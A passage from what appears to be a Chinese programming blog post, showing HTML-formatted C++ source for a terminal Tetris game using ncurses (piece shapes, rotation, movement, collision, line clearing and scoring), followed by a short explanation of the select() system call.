j==game_win_width<span class="number">-1</span>){</span><br><span class="line">box_map[i][j]=<span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">box_map[i][j]=<span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">srand((<span class="keyword">unsigned</span>)time(<span class="number">0</span>));</span><br><span class="line">shape=getrand(<span class="number">0</span>,<span class="number">6</span>);</span><br><span class="line">set_shape(shape,box_shape,size_w,size_h);</span><br><span class="line"></span><br><span class="line">next_shape=getrand(<span class="number">0</span>,<span class="number">6</span>);</span><br><span class="line">set_shape(next_shape,next_box_shape,next_size_w,next_size_h);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)</span><br><span class="line"><span class="keyword">if</span>(next_box_shape[i][j]==<span class="number">1</span>){</span><br><span class="line">mvwaddch(hint_win,(hint_win_height-size_h)/<span class="number">2</span>+i,(hint_win_width-size_w)/<span class="number">2</span>+j,<span class="string">&apos;#&apos;</span>);</span><br><span class="line">wrefresh(hint_win);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mvwprintw(score_win, hint_win_height/<span class="number">2</span>,hint_win_width/<span class="number">2</span><span class="number">-2</span>,<span class="string">&quot;%d&quot;</span>,score);</span><br><span class="line">wrefresh(score_win);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> Piece::set_shape(<span class="keyword">int</span> &amp;cshape, <span class="keyword">int</span> shape[][<span class="number">4</span>],<span class="keyword">int</span> &amp;size_w,<span class="keyword">int</span> &amp;size_h)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)</span><br><span class="line">shape[i][j]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">switch</span>(cshape)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:<span class="comment">// &quot;####&quot;</span></span><br><span class="line">size_h=<span class="number">1</span>;</span><br><span class="line">size_w=<span class="number">4</span>;</span><br><span class="line">shape[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">shape[<span class="number">0</span>][<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">shape[<span class="number">0</span>][<span class="number">2</span>]=<span class="number">1</span>;</span><br><span class="line">shape[<span class="number">0</span>][<span class="number">3</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:<span class="comment">// &quot;#&quot;</span></span><br><span class="line">size_h=<span class="number">2</span>;<span class="comment">// &quot;###&quot;</span></span><br><span class="line">size_w=<span class="number">3</span>;</span><br><span class="line">shape[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">shape[<span class="number">1</span>][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">shape[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">shape[<span class="number">1</span>][<span class="number">2</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:<span class="comment">// &quot;  #&quot;</span></span><br><span class="line">size_h=<span class="number">2</span>;<span class="comment">// &quot;###&quot;</span></span><br><span class="line">size_w=<span class="number">3</span>;</span><br><span class="line">shape[<span class="number">0</span>][<span class="number">2</span>]=<span class="number">1</span>;</span><br><span class="line">shape[<span class="number">1</span>][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">shape[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">shape[<span class="number">1</span>][<span class="number">2</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:<span class="comment">// &quot; ##&quot;</span></span><br><span class="line">size_h=<span class="number">2</span>;<span class="comment">// &quot;##&quot;</span></span><br><span class="line">size_w=<span class="number">3</span>;</span><br><span class="line">shape[<span class="number">0</span>][<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">shape[<span class="number">0</span>][<span class="number">2</span>]=<span class="number">1</span>;</span><br><span class="line">shape[<span class="number">1</span>][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">shape[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:<span class="comment">// &quot;##&quot;</span></span><br><span class="line">size_h=<span class="number">2</span>;<span class="comment">// &quot; ##&quot;</span></span><br><span class="line">size_w=<span class="number">3</span>;</span><br><span class="line">shape[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">shape[<span class="number">0</span>][<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">shape[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">shape[<span class="number">1</span>][<span class="number">2</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:<span class="comment">// &quot;##&quot;</span></span><br><span class="line">size_h=<span class="number">2</span>;<span class="comment">// &quot;##&quot;</span></span><br><span class="line">size_w=<span class="number">2</span>;</span><br><span class="line">shape[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">shape[<span class="number">0</span>][<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">shape[<span class="number">1</span>][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">shape[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:<span class="comment">// &quot; #&quot;</span></span><br><span class="line">size_h=<span class="number">2</span>;<span class="comment">// &quot;###&quot;</span></span><br><span class="line">size_w=<span class="number">3</span>;</span><br><span class="line">shape[<span class="number">0</span>][<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">shape[<span class="number">1</span>][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">shape[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">shape[<span class="number">1</span>][<span class="number">2</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">head_x=game_win_width/<span class="number">2</span>;<span class="comment">// &#x521D;&#x59CB;&#x5316;&#x8D77;&#x59CB;&#x4F4D;&#x7F6E;</span></span><br><span class="line">head_y=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isaggin())    <span class="comment">/* GAME OVER ! */</span></span><br><span class="line">game_over=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> Piece::rotate()</span><br><span class="line">{</span><br><span class="line"><span class="keyword">int</span> temp[<span class="number">4</span>][<span class="number">4</span>]={<span class="number">0</span>};</span><br><span class="line"><span class="keyword">int</span> temp_piece[<span class="number">4</span>][<span class="number">4</span>]={<span class="number">0</span>};</span><br><span class="line"><span class="keyword">int</span> i,j,tmp_size_h,tmp_size_w;</span><br><span class="line"></span><br><span class="line">tmp_size_w=size_w;</span><br><span class="line">tmp_size_h=size_h;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>;i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)</span><br><span class="line">temp_piece[i][j]=box_shape[i][j];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)</span><br><span class="line">temp[j][i]=box_shape[i][j];</span><br><span class="line">i=size_h;</span><br><span class="line">size_h=size_w;</span><br><span class="line">size_w=i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;size_h;i++)</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;size_w;j++)</span><br><span class="line">box_shape[i][size_w<span class="number">-1</span>-j]=temp[i][j];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isaggin()){</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>;i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)</span><br><span class="line">box_shape[i][j]=temp_piece[i][j];</span><br><span class="line">size_w=tmp_size_w;</span><br><span class="line">size_h=tmp_size_h;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span>{</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>;i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++){</span><br><span class="line"><span class="keyword">if</span>(temp_piece[i][j]==<span class="number">1</span>){</span><br><span class="line">mvwaddch(game_win,head_y+i,head_x+j,<span class="string">&apos; &apos;</span>);</span><br><span class="line">wrefresh(game_win);</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size_h;i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size_w;j++){</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">this</span>-&gt;box_shape[i][j]==<span class="number">1</span>){</span><br><span class="line">mvwaddch(game_win,head_y+i,head_x+j,<span class="string">&apos;#&apos;</span>);</span><br><span class="line">wrefresh(game_win);</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> Piece::move(){</span><br><span class="line"> fd_set <span class="built_in">set</span>;</span><br><span class="line"> FD_ZERO(&amp;<span class="built_in">set</span>);</span><br><span class="line"> FD_SET(<span class="number">0</span>, &amp;<span class="built_in">set</span>);</span><br><span class="line">      </span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">timeout</span>;</span></span><br><span class="line"> timeout.tv_sec = <span class="number">0</span>;</span><br><span class="line"> timeout.tv_usec= <span class="number">500000</span>;<span class="comment">// timeout&#x8BBE;&#x7F6E;&#x4E3A;&#x6700;&#x591A;&#x7B49;&#x5F85;&#x65F6;&#x95F4;&#xFF0C;&#x8D85;&#x8FC7;&#x8FD9;&#x4E2A;&#x65F6;&#x95F4;&#x5C06;&#x4E0D;&#x518D;&#x7B49;&#x5F85;getchar</span></span><br><span class="line">      </span><br><span class="line">  <span class="keyword">if</span> (select(<span class="number">1</span>, &amp;<span class="built_in">set</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;timeout) == <span class="number">0</span>){</span><br><span class="line">head_y++;</span><br><span class="line"><span class="keyword">if</span>(isaggin()){</span><br><span class="line">head_y--;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size_h;i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size_w;j++)</span><br><span class="line"><span class="keyword">if</span>(box_shape[i][j]==<span class="number">1</span>)</span><br><span class="line">box_map[head_y+i][head_x+j]=<span class="number">1</span>;</span><br><span class="line">score_next();</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span>{</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=size_h<span class="number">-1</span>; i&gt;=<span class="number">0</span>;i--)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size_w;j++){</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">this</span>-&gt;box_shape[i][j]==<span class="number">1</span>){</span><br><span class="line">mvwaddch(game_win,head_y<span class="number">-1</span>+i,head_x+j,<span class="string">&apos; &apos;</span>);</span><br><span class="line">mvwaddch(game_win,head_y+i,head_x+j,<span class="string">&apos;#&apos;</span>);</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">wrefresh(game_win);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">  }</span><br><span class="line">      </span><br><span class="line"><span class="keyword">if</span> (FD_ISSET(<span class="number">0</span>, &amp;<span class="built_in">set</span>)) {<span class="comment">// &#x5982;&#x679C;&#x5728;&#x89C4;&#x5B9A;&#x7684;&#x65F6;&#x95F4;&#x5185;&#x68C0;&#x6D4B;&#x5230;&#x6309;&#x952E;&#xFF0C;&#x5F97;&#x5230;&#x8F93;&#x5165;key = getchar();</span></span><br><span class="line">        <span class="keyword">while</span> ((key = getch()) == <span class="number">-1</span>) ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(key==KEY_LEFT){<span class="comment">// &#x8FDB;&#x884C;&#x76F8;&#x5173;&#x7684;&#x4E0A;&#x4E0B;&#x5DE6;&#x53F3;&#x7684;&#x79FB;&#x52A8;</span></span><br><span class="line">head_x--;</span><br><span class="line"><span class="keyword">if</span>(isaggin())</span><br><span class="line">head_x++; <span class="comment">//undo</span></span><br><span class="line"><span class="keyword">else</span>{</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size_h;i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size_w;j++){</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">this</span>-&gt;box_shape[i][j]==<span class="number">1</span>){</span><br><span class="line">mvwaddch(game_win,head_y+i,head_x+j+<span class="number">1</span>,<span class="string">&apos; &apos;</span>);</span><br><span class="line">mvwaddch(game_win,head_y+i,head_x+j,<span class="string">&apos;#&apos;</span>);</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">wrefresh(game_win);</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(key==KEY_RIGHT){</span><br><span class="line">head_x++;</span><br><span class="line"><span class="keyword">if</span>(isaggin())</span><br><span class="line">head_x--;</span><br><span class="line"><span class="keyword">else</span>{</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size_h;i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=size_w<span class="number">-1</span>;j&gt;=<span class="number">0</span>;j--){</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">this</span>-&gt;box_shape[i][j]==<span class="number">1</span>){</span><br><span class="line">mvwaddch(game_win,head_y+i,head_x+j<span class="number">-1</span>,<span class="string">&apos; &apos;</span>);</span><br><span class="line">mvwaddch(game_win,head_y+i,head_x+j,<span class="string">&apos;#&apos;</span>);</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">wrefresh(game_win);</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(key==KEY_DOWN){</span><br><span class="line">head_y++;</span><br><span class="line"><span class="keyword">if</span>(isaggin()){</span><br><span class="line">head_y--;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size_h;i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size_w;j++)</span><br><span class="line"><span class="keyword">if</span>(box_shape[i][j]==<span class="number">1</span>)</span><br><span class="line">box_map[head_y+i][head_x+j]=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">score_next();</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span>{</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=size_h<span class="number">-1</span>; i&gt;=<span class="number">0</span>;i--)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size_w;j++){</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">this</span>-&gt;box_shape[i][j]==<span class="number">1</span>){</span><br><span class="line">mvwaddch(game_win,head_y<span class="number">-1</span>+i,head_x+j,<span class="string">&apos; &apos;</span>);</span><br><span class="line">mvwaddch(game_win,head_y+i,head_x+j,<span class="string">&apos;#&apos;</span>);</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">wrefresh(game_win);</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(key==KEY_UP)</span><br><span class="line">rotate();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(head_x+size_w+<span class="number">1</span>&gt;game_win_width)</span><br><span class="line">head_x=game_win_width-size_w<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span>(head_x&lt;<span class="number">1</span>)</span><br><span class="line">head_x=<span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> Piece::isaggin(){<span class="comment">// &#x5224;&#x65AD;&#x56FE;&#x5F62;&#x662F;&#x5426;&#x4E0E;&#x8FB9;&#x754C;&#x6216;&#x5176;&#x4ED6;&#x56FE;&#x5F62;&#x4EA7;&#x751F;&#x51B2;&#x7A81;&#x3002;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size_h;i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size_w;j++){</span><br><span class="line"><span class="keyword">if</span>(box_shape[i][j]==<span class="number">1</span>){</span><br><span class="line"><span class="keyword">if</span>(head_y+i &gt; game_win_height<span class="number">-2</span>)<span class="comment">// &#x9AD8;</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span>(head_x+j &gt; game_win_width<span class="number">-2</span> || head_x+i<span class="number">-1</span>&lt;<span class="number">0</span>)<span class="comment">// &#x5BBD;</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span>(box_map[head_y+i][head_x+j]==<span class="number">1</span>)<span class="comment">// &#x5176;&#x4ED6;&#x56FE;&#x5F62;</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span> ;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> Piece::exsqr(<span class="keyword">int</span> row){<span class="comment">// &#x68C0;&#x67E5;&#x5F53;&#x524D;&#x884C;&#x662F;&#x5426;&#x662F;&#x7A7A;&#x884C;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;game_win_width<span class="number">-1</span>;j++)</span><br><span class="line"><span class="keyword">if</span>(box_map[row][j]==<span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> Piece::judge(){<span class="comment">// &#x5224;&#x65AD;&#x5F53;&#x524D;&#x884C;&#x662F;&#x5426;&#x5DF2;&#x6EE1;</span></span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"><span class="keyword">int</span> line=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> full;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;game_win_height<span class="number">-1</span>;i++){</span><br><span class="line">full=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;game_win_width<span class="number">-1</span>;j++){</span><br><span class="line"><span class="keyword">if</span>(box_map[i][j]==<span class="number">0</span>)</span><br><span class="line">full=<span class="literal">false</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(full){</span><br><span class="line">line++;<span class="comment">// &#x6807;&#x8BB0;&#x5DF2;&#x6EE1;&#x7684;&#x884C;&#x6570;</span></span><br><span class="line">score+=<span class="number">50</span>;<span class="comment">// &#x5982;&#x679C;&#x5F53;&#x524D;&#x884C;&#x5DF2;&#x6EE1;&#xFF0C;&#x5219;&#x5BF9;&#x5E94;&#x7684;&#x5206;&#x6570;+50&#xFF0C;&#x5E76;&#x5C06;&#x5F53;&#x524D;&#x884C;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x5143;&#x7D20;&#x5236;0</span></span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;game_win_width<span class="number">-1</span>;j++)</span><br><span class="line">box_map[i][j]=<span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(line!=<span class="number">0</span>){</span><br><span class="line"><span class="keyword">for</span>(i=game_win_height<span class="number">-2</span>;i&gt;=<span class="number">2</span>;i--){<span class="comment">// &#x4ECE;&#x6700;&#x5E95;&#x5C42;&#x5F00;&#x59CB;&#x5224;&#x65AD;</span></span><br><span class="line"><span class="keyword">int</span> s=i;</span><br><span class="line"><span class="keyword">if</span>(exsqr(i)==<span class="number">0</span>){<span class="comment">// &#x5224;&#x65AD;&#x5F53;&#x524D;&#x884C;&#x662F;&#x5426;&#x662F;&#x7A7A;&#x884C;</span></span><br><span class="line"><span class="keyword">while</span>(s&gt;<span class="number">1</span> &amp;&amp; exsqr(--s)==<span class="number">0</span>);<span class="comment">// &#x5411;&#x4E0A;&#x5BFB;&#x627E;&#xFF0C;&#x76F4;&#x5230;&#x51FA;&#x73B0;&#x4E0D;&#x662F;&#x7A7A;&#x884C;&#x7684;&#x884C;</span></span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;game_win_width<span class="number">-1</span>;j++){</span><br><span class="line">box_map[i][j]=box_map[s][j];</span><br><span class="line">box_map[s][j]=<span class="number">0</span>;<span class="comment">// &#x5C06;&#x4E0D;&#x662F;&#x7A7A;&#x884C;&#x7684;&#xFF0C;&#x79FB;&#x52A8;&#x5230;&#x6700;&#x4E0B;&#x5C42;&#x7684;&#x7A7A;&#x884C;&#x5904;&#xFF0C;&#x5E76;&#x5C06;&#x79FB;&#x52A8;&#x8FC7;&#x4E4B;&#x540E;&#x7684;&#x4F4D;&#x7F6E;&#x5236;0</span></span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;game_win_height<span class="number">-1</span>;i++)<span class="comment">// &#x5237;&#x65B0;&#x5C4F;&#x5E55;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;game_win_width<span class="number">-1</span>;j++){</span><br><span class="line"><span class="keyword">if</span>(box_map[i][j]==<span class="number">1</span>){</span><br><span class="line">mvwaddch(game_win,i,j,<span class="string">&apos;#&apos;</span>);</span><br><span class="line">wrefresh(game_win);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span>{</span><br><span class="line">mvwaddch(game_win,i,j,<span class="string">&apos; &apos;</span>);</span><br><span class="line">wrefresh(game_win);</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> Piece::score_next(){</span><br><span class="line">score+=<span class="number">10</span>;</span><br><span class="line">judge();</span><br><span class="line"></span><br><span class="line">mvwprintw(score_win, hint_win_height/<span class="number">2</span>,hint_win_width/<span class="number">2</span><span class="number">-2</span>,<span class="string">&quot;%d&quot;</span>,score);<span class="comment">// &#x663E;&#x793A;&#x5206;&#x6570;</span></span><br><span class="line">wrefresh(score_win);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set_shape(next_shape,box_shape,size_w,size_h);</span><br><span class="line"></span><br><span class="line"><span class="keyword">this</span>-&gt;next_shape=getrand(<span class="number">0</span>,<span class="number">6</span>);<span class="comment">// &#x663E;&#x793A;&#x4E0B;&#x4E00;&#x4E2A;&#x56FE;&#x5F62;</span></span><br><span class="line">set_shape(next_shape,next_box_shape,next_size_w,next_size_h);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">1</span>;i&lt;hint_win_height<span class="number">-1</span>;i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;hint_win_width<span class="number">-1</span>;j++){</span><br><span class="line">mvwaddch(hint_win, i, j,<span class="string">&apos; &apos;</span>);</span><br><span class="line">wrefresh(hint_win);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)</span><br><span class="line"><span class="keyword">if</span>(next_box_shape[i][j]==<span class="number">1</span>){</span><br><span class="line">mvwaddch(hint_win,(hint_win_height-size_h)/<span class="number">2</span>+i,(hint_win_width-size_w)/<span class="number">2</span>+j,<span class="string">&apos;#&apos;</span>);</span><br><span class="line">wrefresh(hint_win);</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>&#x5728;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x4E2D;&#x4E5F;&#x5B66;&#x5230;&#x4E86;c++&#x7684;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x7684;&#x77E5;&#x8BC6;&#x3002;</p><ul><li>select&#x51FD;&#x6570; &#x7528;&#x6CD5; c++</li></ul><blockquote><p>select&#x51FD;&#x6570;&#x7528;&#x4E8E;&#x5728;&#x975E;&#x963B;&#x585E;&#x4E2D;&#xFF0C;&#x5F53;&#x4E00;&#x4E2A;&#x5957;&#x63A5;&#x5B57;&#x6216;&#x4E00;&#x7EC4;&#x5957;&#x63A5;&#x5B57;&#x6709;&#x4FE1;&#x53F7;&#x65F6;&#x901A;&#x77E5;&#x4F60;&#xFF0C;&#x7CFB;&#x7EDF;&#x63D0;&#x4F9B;select&#x51FD;&#x6570;&#x6765;&#x5B9E;&#x73B0;&#x591A;&#x8DEF;&#x590D;&#x7528;&#x8F93;&#x5165;/&#x8F93;&#x51FA;&#x6A21;&#x578B;&#xFF0C;&#x539F;&#x578B;&#xFF1A;<br>int select(int maxfd,fd_set <em>rdset,fd_set </em>wrset,fd_set <em>exset,struct timeval </em>timeout);<br>&#x6240;&#x5728;&#x7684;&#x5934;&#x6587;&#x4EF6;&#x4E3A;&#xFF1A;#include &lt;sys/time.h&gt; &#x548C;#include &lt;unistd.h&gt;<br>&#x5148;&#x5BF9;&#x51FD;&#x6570;&#x4E2D;&#x7684;&#x53C2;&#x6570;&#x505A;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4ECB;&#x7ECD;&#x3002;&#x53C2;&#x6570;maxfd&#x662F;&#x9700;&#x8981;&#x76D1;&#x89C6;&#x7684;&#x6700;&#x5927;&#x7684;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x503C;+1&#xFF1B;rdset,wrset,exset&#x5206;&#x522B;&#x5BF9;&#x5E94;&#x4E8E;&#x9700;&#x8981;&#x68C0;&#x6D4B;&#x7684;&#x53EF;&#x8BFB;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x7684;&#x96C6;&#x5408;&#xFF0C;&#x53EF;&#x5199;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x7684;&#x96C6; &#x5408;&#x53CA;&#x5F02;&#x5E38;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x7684;&#x96C6;&#x5408;&#x3002;struct timeval&#x7ED3;&#x6784;&#x7528;&#x4E8E;&#x63CF;&#x8FF0;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x957F;&#x5EA6;&#xFF0C;&#x5982;&#x679C;&#x5728;&#x8FD9;&#x4E2A;&#x65F6;&#x95F4;&#x5185;&#xFF0C;&#x9700;&#x8981;&#x76D1;&#x89C6;&#x7684;&#x63CF;&#x8FF0;&#x7B26;&#x6CA1;&#x6709;&#x4E8B;&#x4EF6;&#x53D1;&#x751F;&#x5219;&#x51FD;&#x6570;&#x8FD4;&#x56DE;&#xFF0C;&#x8FD4;&#x56DE;&#x503C;&#x4E3A;0&#x3002;</p></blockquote><p>&#x4F5C;&#x8005;&#xFF1A;shuolol<br>&#x94FE;&#x63A5;&#xFF1A;<a href="https://www.jianshu.com/p/b5d7b7c6b9f7" target="_blank" 